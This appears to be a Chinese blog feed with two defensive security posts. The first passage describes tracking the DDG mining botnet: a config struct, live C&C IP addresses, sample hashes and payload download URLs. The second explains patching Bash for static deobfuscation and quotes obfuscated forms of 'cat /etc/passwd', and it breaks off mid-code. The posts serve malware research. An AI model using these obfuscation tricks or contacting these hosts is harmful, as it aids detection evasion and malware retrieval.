<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2019/02/24 18:01:06 [ERR] memberlist: Failed to send gossip to (114.118.18.70:7946:3020:91f7f67194e0d31d9b58d9e6bef4f711)</div></pre></td></tr></table></figure>
<p>这样，既缩减了日志文件的体积，也能精准捕获到我们需要的信息。然后，就可以把 <code>memberlist.Members()</code> 函数获取到的 Peers 信息和日志文件中打出来的 Peers 信息汇总起来，保存到一个变量中，以待后用。</p>
<h3 id="3-4-保存-Peers-信息"><a href="#3-4-保存-Peers-信息" class="headerlink" title="3.4 保存 Peers 信息"></a>3.4 保存 Peers 信息</h3><p>将上述步骤获取到的 Peers 信息保存到数据库中，最新的 20 条 Peers 信息示例如下：</p>
<p><img src="/imgs/latest_20_peers.png" alt=""></p>
<h3 id="3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据"><a href="#3-5-探测最新活跃的-C-amp-C，拉取最新的配置数据" class="headerlink" title="3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据"></a>3.5 探测最新活跃的 C&amp;C，拉取最新的配置数据</h3><p>对上面获取到的 Peers Info 中的每一个 Peer IP，拼接成 URL 串 <code>http://&lt;peer_ip&gt;:8000/slave</code> ，向该 URL 发 Post 请求。能获取符合格式的配置数据的，即为当前存活的 C&amp;C IP。把存活的 C&amp;C Host 信息保存到一个非重复的、并发安全的 List 结构的变量中，最后把这份 C&amp;C Host 列表保存到本地文件中。本地 C&amp;C Host 文件列表部分内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ tail cc_server.list</div><div class="line">20190503060101  132.148.241.138:8000</div><div class="line">20190503060101  109.237.25.145:8000</div><div class="line">20190503060101  104.128.230.16:8000</div><div class="line">20190503060101  117.141.5.87:8000</div><div class="line">20190506060101  132.148.241.138:8000</div><div class="line">20190506060101  104.128.230.16:8000</div><div class="line">20190506060101  117.141.5.87:8000</div><div class="line">20190506120102  104.128.230.16:8000</div><div class="line">20190506120102  132.148.241.138:8000</div><div class="line">20190506120102  117.141.5.87:8000</div></pre></td></tr></table></figure>
<p>前面提到过 ddg 配置数据是经过 msgPack 编码的，前文也列出了解码后的配置数据示例。受限于 Memberlist 的框架实现，我们的追踪程序也只能用 Go 语言来实现。要解码这份配置数据，直接调用 msgPack 的 Go 语言 API 是不够的，还需要逆向分析出配置数据的正确结构，并用 Go 语言的语法来定义这个配置数据的结构。下面是掉了两把头发才逆向出来的配置数据结构，以 Go 语言来定义的结构体：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> msgpack</div><div class="line"><span class="comment">/*</span></div><div class="line">	Salve conf struct</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="keyword">type</span> Conf <span class="keyword">struct</span> &#123;</div><div class="line">	Data      []<span class="keyword">byte</span></div><div class="line">	Signature []<span class="keyword">byte</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ConfData <span class="keyword">struct</span> &#123;</div><div class="line">	CfgVer <span class="keyword">int</span></div><div class="line">	Config MainConf</div><div class="line">	Miner  []MinerConf</div><div class="line">	Cmd    CmdConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MainConf <span class="keyword">struct</span> &#123;</div><div class="line">	Interval <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> MinerConf <span class="keyword">struct</span> &#123;</div><div class="line">	Exe <span class="keyword">string</span></div><div class="line">	Md5 <span class="keyword">string</span></div><div class="line">	Url <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConf <span class="keyword">struct</span> &#123;</div><div class="line">	AAredis CmdConfDetail</div><div class="line">	AAssh   CmdConfDetail</div><div class="line">	Sh      []ShConf</div><div class="line">	Killer  []ProcConf</div><div class="line">	LKProc  []ProcConf</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> CmdConfDetail <span class="keyword">struct</span> &#123;</div><div class="line">	Id         <span class="keyword">int</span></div><div class="line">	Version    <span class="keyword">int</span></div><div class="line">	ShellUrl   <span class="keyword">string</span></div><div class="line">	Duration   <span class="keyword">string</span></div><div class="line">	NThreads   <span class="keyword">int</span></div><div class="line">	IPDuration <span class="keyword">string</span></div><div class="line">	GenLan     <span class="keyword">bool</span></div><div class="line">	GenAAA     <span class="keyword">bool</span></div><div class="line">	Timeout    <span class="keyword">string</span></div><div class="line">	Ports      []<span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ShConf <span class="keyword">struct</span> &#123;</div><div class="line">	Id      <span class="keyword">int</span></div><div class="line">	Version <span class="keyword">int</span></div><div class="line">	Line    <span class="keyword">string</span></div><div class="line">	Timeout <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> ProcConf <span class="keyword">struct</span> &#123;</div><div class="line">	_msgpack <span class="keyword">struct</span>&#123;&#125; <span class="string">`msgpack:",omitempty"`</span></div><div class="line">	Id       <span class="keyword">int</span></div><div class="line">	Version  <span class="keyword">int</span></div><div class="line">	Expr     <span class="keyword">string</span></div><div class="line">	Timeout  <span class="keyword">string</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>将解码成功的配置数据打到日志文件中，只把未解码的 RAW 配置数据保存到本地。最新获取到的配置数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">➜ ll -t slave_conf | head</div><div class="line">total 4.6M</div><div class="line">2.0K May  6 12:34 117_141_5_87__20190506123410.raw    </div><div class="line">2.0K May  6 12:34 132_148_241_138__20190506123410.raw </div><div class="line">2.0K May  6 12:33 104_128_230_16__20190506123309.raw  </div><div class="line">2.0K May  6 06:33 104_128_230_16__20190506063312.raw  </div><div class="line">2.0K May  6 06:31 117_141_5_87__20190506063142.raw    </div><div class="line">2.0K May  6 06:30 132_148_241_138__20190506063042.raw </div><div class="line">2.0K May  6 00:39 104_128_230_16__20190506003932.raw  </div><div class="line">2.0K May  6 00:37 117_141_5_87__20190506003723.raw    </div><div class="line">2.0K May  6 00:34 132_148_241_138__20190506003442.raw</div></pre></td></tr></table></figure>
<h3 id="3-6-下载最新样本"><a href="#3-6-下载最新样本" class="headerlink" title="3.6 下载最新样本"></a>3.6 下载最新样本</h3><p>对于上面步骤中，每一个可以获取合格配置数据的 C&amp;C IP，拼接 URL 串 <code>http://&lt;cc_ip&gt;:8000/i.sh</code> ，这是 ddg 目前用到的最新恶意 Shell 脚本的下载链接。通过 HTTP GET 请求下载这个 i.sh 文件，跟本地已有的、相同 URL 下载到的 i.sh 文件对比 MD5 值，如果 MD5 跟旧的 i.sh 相同，则丢弃刚下载 i.sh 文件。</p>
<p>如果最新的 i.sh 文件跟旧 i.sh 文件 MD5 不同，则进行以下两步操作：</p>
<ol>
<li><p>对比上述 i.sh 下载链接与刚获取到的最新配置数据中执行的 i.sh 下载链接是否相同，不同则对最新配置数据中指定的 i.sh 脚本也做下载&amp;解析操作；</p>
</li>
<li><p>成功获取到 i.sh 脚本，则解析其中的样本 Download URL，下载样本，同本地相同 URL 下载到的样本对比 MD5 和 FileName(其实是 Download URL)，如果 MD5 或者 FileName 不同，则保留样本，否则删除刚下载到的样本。</p>
<p>样本 MD5 和 FileName 的对比结果，有三种情况：</p>
<ul>
<li><p>仅仅 MD5 不同而 FileName 相同，说明同一个 URL 中下到了不同 MD5 的样本，即样本有更新；</p>
</li>
<li><p>仅仅 FileName 不同而 MD5 相同，则不同的 URL 想到了相同 MD5 的样本，通常意味着 C&amp;C 有变动；</p>
</li>
<li><p>两者都不同则说明 C&amp;C 有变动并且样本有更新。</p>
</li>
</ul>
</li>
</ol>
<p>截至目前，我通过 ddg 追踪程序监控到的部分 ddg 样本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">➜ ll sample</div><div class="line">total 115M</div><div class="line">1.7K 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8.8M 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">1.8K 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3.6M 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.9K 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3.6M 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.1K 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">1.7K 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8.8M 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">1.3K 119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">1.2K 119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">1.6K 119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3.6M 119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">9.4M 119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line"> 11M 119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">1.7K 132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">1.1K 132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8.8M 132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line"> 11M 132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3.6M 132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">3.9M 132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">➜</div><div class="line">➜ md5sum sample/*</div><div class="line">8801aff2ec7c44bed9750f0659e4c533  104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">8c2e1719192caa4025ed978b132988d6  104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">dc477d4810a8d3620d42a6c9f2e40b40  104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">55ea97d94c6d74ceefea2ab9e1de4d9f  104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">100d1048ee202ff6d5f3300e3e3c77cc  117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">5760d5571fb745e7d9361870bc44f7a3  117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">8c2e1719192caa4025ed978b132988d6  117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  117_141_5_87__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  117_141_5_87__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  117_141_5_87__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">09a3a0f662738279e344b2a38dc93ecb  119_9_106_27__8000__i_sh+09a3a0f662738279e344b2a38dc93ecb</div><div class="line">9dc32a4a87d2b579d03b6adb27e3f604  119_9_106_27__8000__i_sh+9dc32a4a87d2b579d03b6adb27e3f604</div><div class="line">b8a64e8bfe4a69c36760505cc757c38d  119_9_106_27__8000__i_sh+b8a64e8bfe4a69c36760505cc757c38d</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  119_9_106_27__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  119_9_106_27__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">c32bd921a71d82696517c22021173480  119_9_106_27__8000__static__3022__ddgs_i686+c32bd921a71d82696517c22021173480</div><div class="line">79d762d1ff16142ea3bdae560558e718  119_9_106_27__8000__static__3022__ddgs_x86_64+79d762d1ff16142ea3bdae560558e718</div><div class="line">44feb3cd31b957e24b18f97c46b57431  132_148_241_138__8000__i_sh+44feb3cd31b957e24b18f97c46b57431</div><div class="line">fcc003280d8e9060e00fb7273d8edee7  132_148_241_138__8000__i_sh+fcc003280d8e9060e00fb7273d8edee7</div><div class="line">8c2e1719192caa4025ed978b132988d6  132_148_241_138__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">d6187a44abacfb8f167584668e02c918  132_148_241_138__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">3ebe43220041fe7da8be63d7c758e1a8  132_148_241_138__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">d894bb2504943399f57657472e46c07d  132_148_241_138__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div></pre></td></tr></table></figure>
<p>综合以上描述，本地文件目录及文件示例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">- ddg_tracker/</div><div class="line">|-- cc_server.list</div><div class="line">|-- log/</div><div class="line">|   |-- 20190123164450.log</div><div class="line">|   |-- 20190123180232.log</div><div class="line">|   |-- 20190123211837.log</div><div class="line">|   |-- 20190124000101.log</div><div class="line">|   |-- 20190124060101.log</div><div class="line">|   `-- ......</div><div class="line">|-- sample/</div><div class="line">|   |-- 104_236_156_211__8000__i_sh+8801aff2ec7c44bed9750f0659e4c533</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   |-- 104_236_156_211__8000__static__3019__fmt_x86_64+d6187a44abacfb8f167584668e02c918</div><div class="line">|   |-- 104_248_181_42__8000__i_sh+dc477d4810a8d3620d42a6c9f2e40b40</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_181_42__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 104_248_251_227__8000__i_sh+55ea97d94c6d74ceefea2ab9e1de4d9f</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_i686+3ebe43220041fe7da8be63d7c758e1a8</div><div class="line">|   |-- 104_248_251_227__8000__static__3020__ddgs_x86_64+d894bb2504943399f57657472e46c07d</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+100d1048ee202ff6d5f3300e3e3c77cc</div><div class="line">|   |-- 117_141_5_87__8000__i_sh+5760d5571fb745e7d9361870bc44f7a3</div><div class="line">|   |-- 117_141_5_87__8000__static__3019__fmt_i686+8c2e1719192caa4025ed978b132988d6</div><div class="line">|   `-- ......</div><div class="line">`-- slave_conf/</div><div class="line">    |-- 104_236_156_211__20190123165004.raw</div><div class="line">    |-- 104_236_156_211__20190123185208.raw</div><div class="line">    |-- 104_236_156_211__20190123223044.raw</div><div class="line">    |-- 104_236_156_211__20190124012600.raw</div><div class="line">    |-- 132_148_241_138__20190224191449.raw</div><div class="line">    `-- ......</div></pre></td></tr></table></figure>
<p>至此，我们就完成了 ddg 追踪程序的设计，为这个程序设置一个计划任务，定时运行一次即可。我个人的源码暂时不会放出来，有兴趣的朋友可以自己动手实现一下。目前的追踪成果(uniq peer ip):</p>
<p><img src="/imgs/count_distinct_ip.png" style="zoom:50%"></p>
<p>一次探测到的活跃节点数：</p>
<p><img src="/imgs/latest_alive_bots.png" alt=""></p>
<p>部分 DDG 更新的 Slack 消息推送：</p>
<p><img src="/imgs/botnet_tracker_slack_msg.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序&lt;br&gt; &lt;strong&gt;文章分为三部分&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Botnet 简介&lt;/li&gt;
&lt;li&gt;DDG.Mining.Botnet 介绍，着重介绍其涉及的 P2P 特性；&lt;/li&gt;
&lt;li&gt;根据 DDG.Mining.Botnet 的 P2P 特性，设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，来遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时获知 Botnet 中最新启用的 C&amp;amp;C 服务器。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;文章首发于安全客，原文链接：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177665&quot;&gt;以P2P的方式追踪 DDG 僵尸网络（上）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177742&quot;&gt;以P2P的方式追踪 DDG 僵尸网络（下）&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="ddg" scheme="http://jiayu0x.com/tags/ddg/"/>
    
      <category term="p2p" scheme="http://jiayu0x.com/tags/p2p/"/>
    
      <category term="botnet" scheme="http://jiayu0x.com/tags/botnet/"/>
    
  </entry>
  
  <entry>
    <title>Patch Bash5.0，让 -x 只打印而不执行，静态解混淆 Shell 脚本</title>
    <link href="http://jiayu0x.com/2019/03/27/patch-bash5.0-for-deobfuscation/"/>
    <id>http://jiayu0x.com/2019/03/27/patch-bash5.0-for-deobfuscation/</id>
    <published>2019-03-26T16:00:00.000Z</published>
    <updated>2019-05-11T05:09:21.642Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>攻防对抗中，JavaScript 和 Powershell 脚本的混淆见得很多，但经过混淆的 Shell 脚本见得相对少一些。其实，Shell 作为一种简易而灵活的编程语言，其脚本也完全可以做到像 JS/Powershell 那样的混淆。混淆一般是为了逃过自动化检测，也可以给人工分析增加难度。比如，针对 <code>cat /etc/passwd</code> 这一条命令就可以用下面 3 种轻度混淆的方式来编写：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cat /et$<span class="string">'c/pa\u0000/notexist/path'</span>sswd</div><div class="line"></div><div class="line"><span class="built_in">test</span>=/ehhh/hmtc/pahhh/hmsswd</div><div class="line">cat <span class="variable">$&#123;test//hh??hm/&#125;</span></div><div class="line"></div><div class="line">tmp_str=saudoihfnssoirtgn</div><div class="line">cat $(<span class="built_in">echo</span> /e)tc$(<span class="built_in">echo</span> /pa)<span class="variable">$&#123;tmp_str:9:2&#125;</span>wd</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>更复杂的 Shell 脚本混淆在真实攻击中也时有发生，比如 <a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="external">systemdMiner 借鸡下蛋，通过 DDG 传播自身</a> 这个案例里的 cron.sh，就经过了高度混淆，混淆到了肉眼几乎什么也看不出来的地步。</p>
<p>对于这些混淆过的 Shell 脚本，最便捷的方式莫过于用 Bash 的 <strong><code>-x</code></strong> 选项，可以对混淆过的脚本逐层解混淆，直到最终还原，以下是上面的 cron.sh 解混淆过程最后部分的截图:</p>
<p><img src="/imgs/mybash_deob_cron_sh.png" alt=""></p>
<p>但是，这个做法有个问题：<code>bash -x &lt;SH_SCRIPT_FILE&gt;</code> <strong>最终会真的执行</strong> Shell 脚本。</p>
<p>如此一来，针对恶意的、混淆过的 Shell 脚本，用这种方法解混淆，就只能扔到 Linux 虚拟机中去执行了。只想看它的动态行为，这样没问题；如果只想对恶意 Shell 脚本进行静态分析，并不想真正执行它，更懒得单独开一个虚拟机去还原它……怎么办？就不能直接通过一个什么工具还原它嘛？或者根据简单的混淆规则、自己写一个小工具对 Shell 脚本自动化解混淆？</p>
<p>我没找到这种工具，研究了一下，Shell 代码混淆的姿势还是有点繁杂的。想自己写一个工具，走语法解析并还原最终代码的路子，会比较艰难。</p>
<p>于是就想，Bash 是自由软件，网上可以直接下载到源码，那能不能试试给 Bash 的源码打个 Patch，让 <strong>-x</strong> 选项仅仅打印解混淆后的 Shell 代码，而不执行最终的 Shell 代码，达到静态解混淆的目的？网上搜 <strong>Shell 反混淆</strong> 相关的资料，搜到这么一篇文章： <a href="https://cloud.tencent.com/developer/article/1369290" target="_blank" rel="external">linux命令反混淆-忙里偷闲</a> ，里面也用到了这个思路，但没有把 Patch Bash 源码的技术细节公开。</p>
<p>只好自动动手试一下，最终给 Bash 5.0 的源码打了一个不完美的 Patch，但基本满足静态解混淆的需求。本文记录给 Bash 源码打 Patch 的思路。</p>
<blockquote>
<p>Bash5.0 源码下载： <a href="https://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz" target="_blank" rel="external">https://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz</a></p>
</blockquote>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>比较直接的思路，就是找到 Bash 源码中最终执行 Shell 代码的位置，根据 <strong>-x</strong> 选项给它 Patch 掉，不让它执行 Shell 代码。这样大概需要做以下 3 件事：</p>
<ol>
<li>确认 <strong>-x</strong> 在代码中的标识。Bash 启动的时候，肯定解析参数，对于 <strong>-x</strong> 选项，肯定要在代码中做一下标记，以便在后续的执行过程中，对于特定的代码要打印出来；</li>
<li>厘清 Bash 从启动到解析 Shell 脚本、解混淆脚本中混淆过的代码到最终执行的大概流程，尤其要梳理清楚这个过程中的关键函数调用路径；</li>
<li>找到最后执行解混淆后 Shell 代码的位置，用 <strong>-x</strong> 选项的标记给它 Patch 一下：如果启用了 <strong>-x</strong> 选项，就不执行代码，否则就执行最终的 Shell 代码。</li>
</ol>
<p>这种工作，注定是“头重脚轻”的工作：开头要做大量的工作，反复研究、设计、校对方案，最后只不过需要在关键位置做几个改动……类似于修一架构造庞杂的机器，事先要做大量的检测工作，最后只需要拧两颗螺丝就搞定。</p>
<p>而 Bash 5.0 有近 20W 行代码，不算很小的项目。好在做这件事并不需要读懂所有代码。</p>
<h2 id="x-echo-command-at-execute"><a href="#x-echo-command-at-execute" class="headerlink" title="-x: echo_command_at_execute"></a>-x: echo_command_at_execute</h2><p>Bash 5.0 的 main() 函数在 <strong>shell.c</strong> 文件中。顺着 main() 函数的执行流程，找到参数解析部分，就能找到 Bash 5.0 如何处理 <strong>-x</strong> 选项的。按照顺序逐个介绍 main() 函数里的关键步骤(主要是关键函数调用路径)。</p>
<hr>
<p><strong>setjmp_nosigs()</strong>：</p>
<p>设置 sigjmp，捕获早期异常。</p>
<hr>
<p><strong>xtrace_init()</strong>：</p>
<p>初始化 <strong>xtrace</strong> 模块。正是该模块设定了 <strong>-x</strong> 选项的底层输出。<strong>-x</strong> 选项，在 Bash 源码中，被称作 <strong>xtrace</strong> ，意思应该就是追踪 Shell 代码的执行了。在 <strong>print_cmd.c</strong> 文件中，有以下定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">xtrace_init</span> <span class="params">()</span></div><div class="line">&#123;</div><div class="line">  xtrace_set (<span class="number">-1</span>, <span class="built_in">stderr</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">xtrace_reset</span> <span class="params">()</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> (xtrace_fd &gt;= <span class="number">0</span> &amp;&amp; xtrace_fp)</div><div class="line">    &#123;</div><div class="line">      fflush (xtrace_fp);</div><div class="line">      fclose 